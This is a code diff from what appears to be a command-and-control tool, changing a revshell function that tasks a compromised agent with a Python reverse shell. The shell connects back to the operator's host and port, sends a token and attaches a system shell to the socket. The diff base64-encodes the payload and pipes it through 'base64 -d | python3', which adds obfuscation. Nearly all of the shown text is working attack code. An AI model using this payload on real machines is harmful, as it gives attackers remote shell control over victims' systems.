@@ -172,16 +172,19 @@ def revshell(manager, agent_id, c2_server):
 
     print(f"{Fore.CYAN}[*] Listener on 0.0.0.0:{port}{Style.RESET_ALL}")
 
-    # Try Python reverse shell
+    # Try Python reverse shell (base64-encoded, no quoting issues)
+    import base64
     py_code = (
-        "import socket,os,subprocess;"
-        f's=socket.socket();s.settimeout(20);'
-        f's.connect(("{host}",{port}));'
-        f's.send(b"{token}\\n");'
-        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-        "subprocess.call([os.environ.get(\"SHELL\",\"/bin/sh\")])"
+        "import socket,os,subprocess\n"
+        f"s=socket.socket();s.settimeout(20)\n"
+        f"s.connect(('{host}',{port}))\n"
+        f"s.send(b'{token}\\n')\n"
+        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
+        "subprocess.call([os.environ.get('SHELL','/bin/sh')])\n"
     )
-    _send_task(manager, agent_id, f"python3 -c \"{py_code}\"", f"Python shell → {host}:{port}")
+    b64 = base64.b64encode(py_code.encode()).decode()
+    py_payload = f"echo {b64} | base64 -d | python3"
+    _send_task(manager, agent_id, py_payload, f"Python shell → {host}:{port}")
 
     conn, addr = _listen_and_verify(srv, token, timeout=20)
     srv.close()
